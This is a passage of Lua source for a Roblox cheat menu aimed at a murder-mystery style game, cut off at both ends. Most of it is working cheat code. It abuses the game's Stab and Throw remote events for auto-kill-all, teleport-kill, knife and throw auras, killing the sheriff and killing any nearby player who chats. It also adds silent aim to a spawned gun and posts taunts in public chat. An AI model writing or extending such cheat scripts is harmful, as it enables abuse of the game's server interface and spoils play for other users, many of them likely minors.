				errornotify("knife not dectected - try again")
				return
			end
		end


		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player ~= localplayer then
			HidePlayer(player)
			player.Character:FindFirstChild("HumanoidRootPart").Anchored = true
			player.Character:FindFirstChild("HumanoidRootPart").CFrame = localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame + localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 1 
		end	


		local args = {
			[1] = "Slash"
		}
		localplayer.Character.Knife.Stab:FireServer(unpack(args))
	end



	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	local Mouse = LocalPlayer:GetMouse()


	local function StartSelectModeWithLPMouse(callback)
		local selectionActive = true
		local highlightInstance = nil
		local connection

		warningnotify("Click on a player to select him (15 seconds).")

		-- Finaliza el modo de selección
		local function endSelection()
			selectionActive = false
			if connection then
				connection:Disconnect()
			end
			if highlightInstance then
				highlightInstance:Destroy()
			end
		end

		-- Espera 1 segundo antes de permitir seleccionar
		task.delay(1, function()
			if not selectionActive then return end

			connection = Mouse.Button1Down:Connect(function()
				if not selectionActive then return end

				local target = Mouse.Target
				if not target then
					errornotify("You are not aiming at any object.")
					return
				end

				local model = target:FindFirstAncestorOfClass("Model")
				if not model then
					errornotify("You are not targeting a player.")
					return
				end

				local selectedPlayer = Players:GetPlayerFromCharacter(model)
				if selectedPlayer and selectedPlayer ~= LocalPlayer then
					sucessnotify("You have selected: " .. selectedPlayer.Name)

					-- Highlight temporal
					highlightInstance = Instance.new("Highlight")
					highlightInstance.Name = "TemporaryHighlight"
					highlightInstance.FillColor = Color3.fromRGB(255, 255, 0)
					highlightInstance.OutlineColor = Color3.fromRGB(255, 255, 0)
					highlightInstance.Adornee = model
					highlightInstance.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					highlightInstance.Parent = model

					callback(selectedPlayer)
					task.delay(2, endSelection)
				else
					errornotify("You have not selected a valid player.")
				end
			end)
		end)

		-- Tiempo límite
		task.delay(15, function()
			if selectionActive then
				errornotify("Time out. No player selected.")
				endSelection()
			end
		end)
	end

	MouseButton1Click("Select Any One For Kill", function() 
		StartSelectModeWithLPMouse(function(selectedPlayer)
			-- Llamada a la función de asesinato
			killAsMURDERER(selectedPlayer)
		end)
	end)

	local Loops = {
		Auto_Kill_Everyone = false,
		Auto_Throw_Knife = false,
		Anti_Murder = false
	}

	local AutoKillEveryone = script.Parent.autokilleveryone

	local Connection


	AutoKillEveryone.MouseButton1Click:Connect(function()
		if Loops.Auto_Kill_Everyone == false then
			Loops.Auto_Kill_Everyone = true
			AutoKillEveryone.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			Connection = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
				if child.Name == "Knife" then

					if not localplayer.Character:FindFirstChild("Knife") then
						local hum = localplayer.Character:FindFirstChild("Humanoid")
						if localplayer.Backpack:FindFirstChild("Knife") then
							localplayer.Character:FindFirstChild("Humanoid"):EquipTool(localplayer.Backpack:FindFirstChild("Knife"))
						else
							errornotify("knife not dectected - try again")
							return
						end
					end

					for _, player in ipairs(game.Players:GetPlayers()) do
						if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player ~= localplayer then
							player.Character:FindFirstChild("HumanoidRootPart").Anchored = true
							player.Character:FindFirstChild("HumanoidRootPart").CFrame = localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame + localplayer.Character:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 1 

						end	
					end

					local args = {
						[1] = "Slash"
					}
					localplayer.Character.Knife.Stab:FireServer(unpack(args))
				elseif Loops.Auto_Kill_Everyone == true then
					Connection:Disconnect()
					AutoKillEveryone.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
					Loops.Auto_Kill_Everyone = false
				end
			end)
		end
	end)



	local function findNearestPlayer()
		local Players = game:GetService("Players")
		local localPlayer = Players.LocalPlayer

		local nearestPlayer = nil
		local shortestDistance = math.huge -- Initialize with a very large distance

		-- Iterate through all players
		for _, player in ipairs(Players:GetPlayers()) do
			-- Skip the local player and any players who have left the game
			if player ~= localPlayer and player.Character then 

				-- Get the positions of both players' HumanoidRootParts
				local localRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
				local otherRootPart = player.Character:FindFirstChild("HumanoidRootPart")

				-- Ensure both players have a HumanoidRootPart for accurate distance calculation
				if localRootPart and otherRootPart then
					local distance = (localRootPart.Position - otherRootPart.Position).Magnitude

					-- Update nearest player if a closer one is found
					if distance < shortestDistance then
						shortestDistance = distance
						nearestPlayer = player
					end
				end
			end
		end

		return nearestPlayer
	end


	local function throwKnife(equippKnife: boolean)


		local NearestPlayer = findNearestPlayer()

		if not NearestPlayer or not NearestPlayer.Character then
			return
		end
		if equippKnife then
			local hum = localplayer.Character:FindFirstChild("Humanoid")
			if localplayer.Backpack:FindFirstChild("Knife") then
				localplayer.Character:FindFirstChild("Humanoid"):EquipTool(localplayer.Backpack:FindFirstChild("Knife"))
			else
				errornotify("knife not dectected - try again")
				return
			end
		end
		local nearestHRP = NearestPlayer.Character:FindFirstChild("HumanoidRootPart")

		local lpknife = localplayer.Character:FindFirstChild("Knife")
		if not lpknife then return end

		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.FilterDescendantsInstances = {localplayer.Character}
		local rayResult = workspace:Raycast(lpknife:GetPivot().Position, (nearestHRP.Position - localplayer.Character:FindFirstChild("HumanoidRootPart").Position).Unit * 350, raycastParams)
		local toThrow = nearestHRP.Position

		local args = {
			[1] = lpknife:GetPivot(), 
			[2] = toThrow
		}

		localplayer.Character.Knife.Throw:FireServer(unpack(args))
	end

	local connectionV2

	script.Parent.autothrowknifewhenvisibleplayer.MouseButton1Click:Connect(function()
		if Loops.Auto_Throw_Knife == false then
			script.Parent.autothrowknifewhenvisibleplayer.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			connectionV2 = game:GetService("RunService").RenderStepped:Connect(function()
				throwKnife()
			end)
			Loops.Auto_Throw_Knife = true
		else
			connectionV2:Disconnect()
			script.Parent.autothrowknifewhenvisibleplayer.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			Loops.Auto_Throw_Knife = false
		end
	end)

	local ConnectionV3 

	script.Parent.antimurder.MouseButton1Click:Connect(function()
		if Loops.Anti_Murder == false then
			script.Parent.antimurder.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			ConnectionV3 = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
				if child:IsA("Tool") and child.Name:lower() == "knife" then
					localplayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				end
			end)
			Loops.Anti_Murder = true
		else
			Loops.Anti_Murder = false
			ConnectionV3:Disconnect()
			script.Parent.antimurder.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)


	local function TrashTalk()
		local words = {
			"sonned",
			"bad",
			"im just better",
			"skill",
			"go play adopt me",
			"awesome",
			"fly high",
			"son",
		}

		local random = math.random(1, #words)
		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(random)
	end
	local Players = game:GetService("Players")

	local player = Players.LocalPlayer
	local IsActive = false

	local TTWhenKillingSomeone = script.Parent.trashtalkwhenkillingsomeone
	local IsActiveFrame = TTWhenKillingSomeone.Frame
	local button = TTWhenKillingSomeone
	-- Función para verificar si el jugador local tiene equipada una knife
	local function HasKnifeEquipped()
		local character = player.Character
		if not character then return false end
		local tool = character:FindFirstChildOfClass("Tool")
		return tool and (tool.Name:lower() == "knife")
	end

	-- Función para conectar el evento Died al personaje del jugador objetivo
	local function ConnectDeathCheckForPlayer(targetPlayer)
		-- Asegurarse de que el jugador no es el jugador local
		if targetPlayer == player then return end

		local function onCharacterAdded(character)
			local humanoid = character:WaitForChild("Humanoid", 5)
			if not humanoid then return end

			humanoid.Died:Connect(function()
				if not IsActive then return end
				if not HasKnifeEquipped() then return end

				local myChar = player.Character
				if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end
				if not character:FindFirstChild("HumanoidRootPart") then return end

				local distance = (myChar.HumanoidRootPart.Position - character.HumanoidRootPart.Position).Magnitude
				if distance <= 10 then
					print(player.Name .. " mató a " .. targetPlayer.Name .. " de cerca.")
					TrashTalk()
				else
					print("El asesinato fue lejano. No se hace nada.")
				end
			end)
		end

		-- Conectar al character actual si ya existe
		if targetPlayer.Character then
			onCharacterAdded(targetPlayer.Character)
		end

		-- Conectar para futuros respawns
		targetPlayer.CharacterAdded:Connect(onCharacterAdded)
	end

	-- Botón para activar/desactivar
	button.MouseButton1Click:Connect(function()
		IsActive = not IsActive
		if IsActive then
			IsActiveFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		else
			IsActiveFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
		print("Trashtalk activado:", IsActive)
	end)

	task.spawn(function()
		-- Conectar todos los jugadores actuales
		for _, otherPlayer in ipairs(Players:GetPlayers()) do
			ConnectDeathCheckForPlayer(otherPlayer)
		end

		-- También conectar nuevos jugadores
		Players.PlayerAdded:Connect(function(newPlayer)
			ConnectDeathCheckForPlayer(newPlayer)
		end)

	end)

	MouseButton1Click("Teleport Kill All", function()
		if not localplayer.Character:FindFirstChild("Knife") then
			local hum = localplayer.Character:FindFirstChild("Humanoid")
			if localplayer.Backpack:FindFirstChild("Knife") then
				localplayer.Character:FindFirstChild("Humanoid"):EquipTool(localplayer.Backpack:FindFirstChild("Knife"))
			else
				errornotify("knife not dectected - try again")
				return
			end
		end

		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")

		local localPlayer = Players.LocalPlayer

		-- Esperar a que el personaje local esté listo
		local function WaitForCharacter()
			if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
				return
			end
			localPlayer.CharacterAdded:Wait()
		end

		WaitForCharacter()

		-- Función para teletransportarse detrás de un jugador objetivo
		local function TeleportBehind(targetCharacter)
			local localCharacter = localPlayer.Character
			if not localCharacter or not localCharacter:FindFirstChild("HumanoidRootPart") then return end
			if not targetCharacter or not targetCharacter:FindFirstChild("HumanoidRootPart") then return end

			local targetHRP = targetCharacter.HumanoidRootPart
			local offsetBack = -4
			local backPosition = targetHRP.Position - (targetHRP.CFrame.LookVector * offsetBack)
			local newCFrame = CFrame.new(backPosition, targetHRP.Position)

			localCharacter:MoveTo(newCFrame.Position)
		end

		-- Procesar a cada jugador
		for _, otherPlayer in ipairs(Players:GetPlayers()) do
			if otherPlayer ~= localPlayer then
				local character = otherPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						print("Persiguiendo a:", otherPlayer.Name)

						repeat
							TeleportBehind(character)
							local args = {
								[1] = "Slash"
							}
							localplayer.Character.Knife.Stab:FireServer(unpack(args))
							task.wait(0.1) -- frecuencia del teletransporte (más baja = más rápido)
						until humanoid.Health <= 0

						print(otherPlayer.Name .. " ha muerto. Pasando al siguiente jugador.")
					end
				end
			end
		end

	end)

	local ConnectionV9


	local function findMurderer()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("knife") then
				return i
			end
		end


		return nil
	end

	local function findSheriff()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Gun") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Gun") then
				return i
			end
		end



		return nil
	end

	script.Parent.killsherrifwhenbeingmurder.MouseButton1Click:Connect(function()
		if ConnectionV9 then
			ConnectionV9:Disconnect()
			ConnectionV9 = nil
			script.Parent.killsherrifwhenbeingmurder.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			print("Sheriff killing disabled.")
		else
			ConnectionV9 = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
				if child:IsA("Tool") and child.Name == "Knife" then
					--equipp the knife
					LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(child)
					local SherrifToKill = findSheriff()
					if not SherrifToKill then repeat
							SherrifToKill = findSheriff()
							task.wait(0.5)
						until SherrifToKill
						killAsMURDERER(SherrifToKill)
					end

				end
			end)
			script.Parent.killsherrifwhenbeingmurder.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			print("Sheriff killing enabled.")
		end
	end)

	local IsActiveAKWNP = false

	script.Parent.activateKnifeWhenNearPlayer.MouseButton1Click:Connect(function()
		if IsActiveAKWNP then
			IsActiveAKWNP = false
			script.Parent.activateKnifeWhenNearPlayer.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			print("Knife activation disabled.")
		else
			IsActiveAKWNP = true
			script.Parent.activateKnifeWhenNearPlayer.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			print("Knife activation enabled.")
			task.spawn(function()
				while IsActiveAKWNP do
					local character = LocalPlayer.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
									if otherPlayer ~= LocalPlayer and otherPlayer.Character then
										local otherHumanoidRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
										if otherHumanoidRootPart then
											local distance = (humanoidRootPart.Position - otherHumanoidRootPart.Position).Magnitude
											if distance <= 10 then
												-- Equipped the knife
												task.spawn(function()
													humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Knife"))
												end)
												local args = {
													[1] = "Slash"
												}
												localplayer.Character.Knife.Stab:FireServer(unpack(args))
											end 
										end
									end 
								end
							end
						end 
					end 
				end	
			end)
		end
	end)


	local KnifeAuraActive = false
	local KnifeAuraButton = script.Parent.knifeaura
	local KnifeAuraValue = script.Parent.TextBoxButton1KnifeAura
	local KnifeAuraDistance = 10
	local changeKnifeAuraDistance = function(number: number) KnifeAuraDistance = number end

	KnifeAuraButton.MouseButton1Click:Connect(function()
		if KnifeAuraActive then
			KnifeAuraActive = false
			KnifeAuraButton.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			print("Knife aura disabled.")
		else
			KnifeAuraActive = true
			KnifeAuraButton.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			print("Knife aura enabled.")
			task.spawn(function()
				while KnifeAuraActive do
					local character = LocalPlayer.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
									if otherPlayer ~= LocalPlayer and otherPlayer.Character then
										local otherHumanoidRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
										if otherHumanoidRootPart then
											local distance = (humanoidRootPart.Position - otherHumanoidRootPart.Position).Magnitude
											if distance <= KnifeAuraDistance then
												-- Equipped the knife
												killAsMURDERER(otherPlayer)
											end
										end
									end
								end
							end
						end
					end
					task.wait(0.1) -- Adjust the wait time as needed for the desired frequency
				end
			end)
		end
	end)

	KnifeAuraValue.TextBox.FocusLost:Connect(function()
		local text = KnifeAuraValue.TextBox.Text
		local number = tonumber(text)
		if number then
			changeKnifeAuraDistance(number)
		else
			errornotify("enter a valid number")
			KnifeAuraValue.TextBox.Text = "10" -- Default value
			changeKnifeAuraDistance(10)
		end
	end)

	local KnifeThrowAura = false
	local KnifeThrowAuraButton = script.Parent.throwaura
	local IsActiveFrameColorKnifeThrowAuraButton = KnifeAuraButton.Frame
	local KnifeThrowAuraValue = script.Parent.TextBoxButton1ThrowAura
	local KnifeThrowAuraDistance = 10
	local ChangeKnifeThrowAuraDistanceNumber = function(number: number) KnifeThrowAuraDistance = number end

	game.Workspace.ChildAdded:Connect(function(chi)
		if chi.Name == "ThrowingKnife" and KnifeThrowAura and findMurderer() == LocalPlayer then

			--try to find some part or MeshPart or BasePart for the operation
			local part = chi:FindFirstChildWhichIsA("BasePart")
			if part then

				local function getPosition()
					return part.Position
				end

				local function DectectNearPlayersFromPart(Distance)
					local listOfNearPlayers = {}
					for i, v in pairs(game.Players:GetPlayers()) do
						if v.Character then
							local HRP = v.Character:FindFirstChild("HumanoidRootPart")
							if HRP then
								local HRPPosition = HRP.Position
								local PartPosition = getPosition()
								local magnitude = (HRPPosition - PartPosition).Magnitude
								if magnitude <= Distance then
									table.insert(listOfNearPlayers, v)

								end
							end
						end
					end
					return listOfNearPlayers
				end

				part:GetPropertyChangedSignal("Position"):Connect(function()
					local nearPlayers = DectectNearPlayersFromPart(KnifeThrowAuraDistance)
					for i, v in pairs(nearPlayers) do
						killAsMURDERER(v)
					end
				end)
			end
		end
	end)

	KnifeThrowAuraButton.MouseButton1Click:Connect(function()
		if KnifeThrowAura == false then
			KnifeThrowAura = true
			IsActiveFrameColorKnifeThrowAuraButton.BackgroundColor3 = Color3.new(0, 1, 0)
		else
			KnifeThrowAura = false
			IsActiveFrameColorKnifeThrowAuraButton.BackgroundColor3 = Color3.new(1, 0, 0)
		end
	end)

	KnifeThrowAuraValue.TextBox.FocusLost:Connect(function()
		local text = KnifeThrowAuraValue.TextBox.Text
		local number = tonumber(text)
		if number then
			ChangeKnifeThrowAuraDistanceNumber(number)
		else
			errornotify("enter a valid number")
			KnifeThrowAuraValue.TextBox.Text = "10" -- Default value
			ChangeKnifeThrowAuraDistanceNumber(10)
		end
	end)


	task.spawn(function()
		local selectingKey = false
		local UserInputService = game:GetService("UserInputService")
		local button = FindButtonWithMatchedString("Select Key For Predict")
		local flashing = false
		local originalBGColor = button.BackgroundColor3
		local originalTextStroke = button.TextStrokeColor3
		local selectedKey = Enum.KeyCode.Unknown
		local function startKeySelection()
			if selectingKey then return end
			selectingKey = true
			button.Text = "  Press any key..."
			button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
			flashing = true

			-- Flash stroke
			task.spawn(function()
				while flashing do
					button.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
					task.wait(0.5)
					button.TextStrokeColor3 = originalTextStroke
					task.wait(0.5)
				end
			end)
		end

		local function onInputBegan(input, gameProcessed)
			if selectingKey and not gameProcessed then
				if input.UserInputType == Enum.UserInputType.Keyboard then
					selectedKey = input.KeyCode
					local keyName = selectedKey.Name
					button:SetAttribute("SELECTED_KEY", keyName)
					button.Text = string.format("Throw Knife - %s  ", keyName)
					selectingKey = false
					flashing = false
					button.BackgroundColor3 = originalBGColor
					button.TextStrokeColor3 = originalTextStroke
				end
			end
		end

		button.MouseButton1Click:Connect(startKeySelection)
		UserInputService.InputBegan:Connect(onInputBegan)
	end)
	local SavedButtonBeforeKey = FindButtonWithMatchedString("Select Key For Predict")
	local ConnectionV10 
	local KeyForPredictThrowKnife = script.Parent.presskeyforpredictthrowknife
	local isactivekeyforpredictthrowknifeFRAMEBackGroundColor = KeyForPredictThrowKnife.Frame

	KeyForPredictThrowKnife.MouseButton1Click:Connect(function()
		if ConnectionV10 then
			ConnectionV10:Disconnect()
			isactivekeyforpredictthrowknifeFRAMEBackGroundColor.BackgroundColor3 = Color3.new(1, 0, 0)
			ConnectionV10 = nil
		else
			ConnectionV10 = game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
				if input.UserInputType == Enum.UserInputType.Keyboard and not gameProcessed then
					--if input key code was SavedButtonBeforeKey Attribute then
					if input.KeyCode.Name == SavedButtonBeforeKey:GetAttribute("SELECTED_KEY") then
						throwKnife(true)
					end
				end
			end)
			isactivekeyforpredictthrowknifeFRAMEBackGroundColor.BackgroundColor3 = Color3.new(0, 1, 0)
		end
	end)

	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local killanyonewhotalks = script.Parent.killanyonewhotalks
	local toggleFrame = killanyonewhotalks.Frame
	local toggleButton = killanyonewhotalks

	-- Estado del sistema
	local systemActive = false

	-- Función que tú defines en otro lugar:
	-- function killAsMURDERER(targetPlayer) ... end

	-- Estilo visual del toggle
	local function updateVisual()
		if systemActive then
			toggleFrame.BackgroundColor3 = Color3.fromRGB(100, 255, 100) -- Verde activado
		else
			toggleFrame.BackgroundColor3 = Color3.fromRGB(255, 100, 100) -- Rojo desactivado
		end
	end

	updateVisual()

	-- Toggle visual on click
	toggleButton.MouseButton1Click:Connect(function()
		systemActive = not systemActive
		updateVisual()
	end)

	-- Detectar cuando un jugador habla
	local function onChatted(speaker, message)
		if not systemActive then return end
		if not speaker.Character or not localPlayer.Character then return end

		local speakerRoot = speaker.Character:FindFirstChild("HumanoidRootPart")
		local localRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not speakerRoot or not localRoot then return end

		local distance = (speakerRoot.Position - localRoot.Position).Magnitude
		if distance <= 70 and speaker ~= localPlayer then
			pcall(function()
				killAsMURDERER(speaker)
			end)
		end
	end

	-- Conectar al evento Chatted de todos los jugadores
	local function connectPlayer(player)
		player.Chatted:Connect(function(message)
			onChatted(player, message)
		end)
	end

	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= localPlayer then
			connectPlayer(p)
		end
	end

	Players.PlayerAdded:Connect(function(player)
		if player ~= localPlayer then
			connectPlayer(player)
		end
	end)


	---------------

	local function GiveModifiedGun(GunName: string, callback)
		--    ModifiedGun - By G0bbyD0llan

		--    Converted with ttyyuu12345's model to script plugin v4

		task.spawn(function()
			-- Tabla de coroutines si se necesita
			local cors = {}

			-- Crear herramienta
			local gunTool = Instance.new("Tool")
			gunTool.Name = (GunName or "Modified").."Gun"
			gunTool.TextureId = "rbxassetid://97889613"
			gunTool.CanBeDropped = false
			gunTool.Grip = CFrame.new(0, -0.4, -0.3, 1, 0, 0, 0, 8.5e-07, -1, 0, 1, 8.5e-07)
			gunTool.GripForward = Vector3.new(0, 1, -8.5e-07)
			gunTool.GripPos = Vector3.new(0, -0.4, -0.3)
			gunTool.GripUp = Vector3.new(0, 8.5e-07, 1)
			gunTool.Parent = game:GetService("Players").LocalPlayer.Backpack

			-- Crear mango (Handle)
			local handle = Instance.new("Part")
			handle.Name = "Handle"
			handle.Size = Vector3.new(0.2, 1.83, 1.03)
			handle.Position = Vector3.new(-35, 3.515, 244)
			handle.Orientation = Vector3.new(-90, 180, 0)
			handle.Rotation = Vector3.new(-90, 0, 180)
			handle.CFrame = CFrame.new(-35, 3.515, 244, -1, 0, 0, 0, 0, 1, 0, 1, 0)
			handle.BottomSurface = Enum.SurfaceType.Smooth
			handle.TopSurface = Enum.SurfaceType.Smooth
			handle.CanCollide = false
			handle.FormFactor = Enum.FormFactor.Custom
			handle.formFactor = Enum.FormFactor.Custom
			handle.Parent = gunTool

			-- Malla especial del arma
			local mesh = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.FileMesh
			mesh.MeshId = "http://www.roblox.com/asset/?id=79401392"
			mesh.TextureId = "http://www.roblox.com/asset/?id=91723031"
			mesh.Scale = Vector3.new(1.6, 1.6, 1.6)
			mesh.Parent = handle

			-- Sonido de disparo
			local fireSound = Instance.new("Sound")
			fireSound.Name = "FireSound"
			fireSound.SoundId = "http://www.roblox.com/asset/?id=10209803"
			fireSound.Volume = 1
			fireSound.Parent = handle

			-- Sonido de recarga
			local reloadSound = Instance.new("Sound")
			reloadSound.Name = "Reload"
			reloadSound.SoundId = "rbxassetid://6336569579"
			reloadSound.Volume = 1
			reloadSound.Parent = handle

			-- Sonido de impacto
			local hitSound = Instance.new("Sound")
			hitSound.Name = "Hit"
			hitSound.SoundId = "rbxassetid://7031275541"
			hitSound.Volume = 10
			hitSound.Parent = handle

			-- Sonido de equipar máscara
			local equipSound = Instance.new("Sound")
			equipSound.Name = "Mask_Equip"
			equipSound.SoundId = "rbxassetid://2706199011"
			equipSound.Parent = handle

			-- Parte invisible para origen de trazo (tracer)
			local tracerOrigin = Instance.new("Part")
			tracerOrigin.Name = "ShootTracerStarterPosition"
			tracerOrigin.Size = Vector3.new(0.17, 0.17, 0.17)
			tracerOrigin.Position = Vector3.new(-35, 3.895, 244.915)
			tracerOrigin.CFrame = CFrame.new(-35, 3.895, 244.915, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			tracerOrigin.Transparency = 1
			tracerOrigin.CanCollide = false
			tracerOrigin.BottomSurface = Enum.SurfaceType.Smooth
			tracerOrigin.TopSurface = Enum.SurfaceType.Smooth
			tracerOrigin.Parent = handle

			-- Unión entre la parte del disparo y el handle
			local weld = Instance.new("WeldConstraint")
			weld.Part0 = handle
			weld.Part1 = tracerOrigin
			weld.Parent = tracerOrigin


			----------------------------------------------------------------------------------------------------------------


			local InstantReload = false
			local HoldClickToShootMultipleAtOnce = false
			local ShootInDirections = false
			local CreateHitMarkers = false
			local SilentAimOnShoot = false -- <== NUEVA VARIABLE

			-- Services
			local Players = game:GetService("Players")
			local UserInputService = game:GetService("UserInputService")
			local Debris = game:GetService("Debris")
			local Workspace = game:GetService("Workspace")

			-- Constants
			local RAY_MAX_DISTANCE = 1000
			local RELOAD_COOLDOWN = 0.5

			-- Player and Tool
			local player = Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
			local humanoid = character:WaitForChild("Humanoid")
			local mouse = player:GetMouse()
			local tool = gunTool
			local handle = tool:WaitForChild("Handle")

			-- Sounds
			local fireSound = handle:WaitForChild("FireSound")
			local hitSound = handle:WaitForChild("Hit")
			local reloadSound = handle:WaitForChild("Reload")

			-- Gun state
			local canShoot = true
			local isReloading = false

			-- Muzzle Part
			local muzzlePart = handle:WaitForChild("ShootTracerStarterPosition")

			-- Asegurarse de que esté soldada al handle
			if not muzzlePart:FindFirstChildOfClass("WeldConstraint") then
				local weld = Instance.new("WeldConstraint")
				weld.Part0 = handle
				weld.Part1 = muzzlePart
				weld.Parent = muzzlePart
			end

			-- Function to create tracer
			local function createTracer(fromPosition, toPosition)
				local distance = (fromPosition - toPosition).Magnitude
				if distance < 0.1 then return end
				local tracer = Instance.new("Part")
				tracer.Name = "Tracer"
				tracer.Anchored = true
				tracer.CanCollide = false
				tracer.Material = Enum.Material.SmoothPlastic
				tracer.Transparency = 0.5
				tracer.Color = Color3.new(1, 1, 1)
				tracer.Size = Vector3.new(0.1, 0.1, distance)
				tracer.CFrame = CFrame.lookAt(fromPosition, toPosition) * CFrame.new(0, 0, -distance / 2)
				tracer.Parent = Workspace
				Debris:AddItem(tracer, 0.1)
			end

			local function getClosestPlayerToCursor(cursorWorldPosition)
				local closestPlayer = nil
				local shortestDistance = math.huge

				for _, otherPlayer in ipairs(Players:GetPlayers()) do
					if otherPlayer ~= player and otherPlayer.Character then
						local rootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
						if rootPart then
							local distance = (cursorWorldPosition - rootPart.Position).Magnitude
							if distance < shortestDistance then
								shortestDistance = distance
								closestPlayer = otherPlayer
							end
						end
					end
				end

				return closestPlayer
			end

			local function createHitMarker(position)
				if not CreateHitMarkers then return end
				local marker = Instance.new("Part")
				marker.Name = "HitMarker"
				marker.Anchored = true
				marker.CanCollide = false
				marker.Material = Enum.Material.Neon
				marker.Color = Color3.fromRGB(255, 0, 0)
				marker.Shape = Enum.PartType.Ball
				marker.Size = Vector3.new(0.3, 0.3, 0.3)
				marker.Position = position
				marker.Parent = Workspace
				Debris:AddItem(marker, 0.3)
			end

			local function fireRay(direction)
				local muzzlePosition = muzzlePart.Position
				local raycastParams = RaycastParams.new()
				raycastParams.FilterDescendantsInstances = {player.Character, tool}
				raycastParams.FilterType = Enum.RaycastFilterType.Exclude

				local raycastResult = Workspace:Raycast(muzzlePosition, direction * RAY_MAX_DISTANCE, raycastParams)
				local hitPosition = raycastResult and raycastResult.Position or (muzzlePosition + direction * RAY_MAX_DISTANCE)

				createTracer(muzzlePosition, hitPosition)

				local targetHumanoid = nil

				if raycastResult then
					createHitMarker(hitPosition)
					local hitPart = raycastResult.Instance
					local hitModel = hitPart:FindFirstAncestorOfClass("Model")
					if hitModel then
						targetHumanoid = hitModel:FindFirstChildOfClass("Humanoid")
					end
				end

				if not targetHumanoid and SilentAimOnShoot then
					local silentTarget = getClosestPlayerToCursor(hitPosition)
					if silentTarget and silentTarget.Character then
						local humanoid = silentTarget.Character:FindFirstChildOfClass("Humanoid")
						local root = silentTarget.Character:FindFirstChild("HumanoidRootPart")
						if humanoid and root then
							createTracer(muzzlePosition, root.Position)
							createHitMarker(root.Position)
							targetHumanoid = humanoid
							hitPosition = root.Position
						end
					end
				end

				if targetHumanoid then
					hitSound:Play()
					if typeof(callback) == "function" then
						local playerHit = game.Players:GetPlayerFromCharacter(targetHumanoid.Parent)
						if playerHit then
							pcall(function()
								callback(playerHit)
							end)
						end
					end
				end
			end

			local function reloadGun()
				if isReloading then return end
				isReloading = true
				reloadSound:Play()
				local reloadDuration = reloadSound.TimeLength
				if reloadDuration <= 0 then reloadDuration = 2 end
				task.wait(reloadDuration)
				isReloading = false
				canShoot = true
			end

			local function shoot()
				if not canShoot or isReloading then return end
				if not character or not humanoid or humanoid.Health == 0 then return end
				if not handle then return end

				local muzzlePosition = muzzlePart.Position
				local mousePos = mouse.Hit and mouse.Hit.Position or (mouse.UnitRay.Origin + mouse.UnitRay.Direction * RAY_MAX_DISTANCE)
				local baseDir = (mousePos - muzzlePosition).Unit

				canShoot = false
				fireSound:Play()

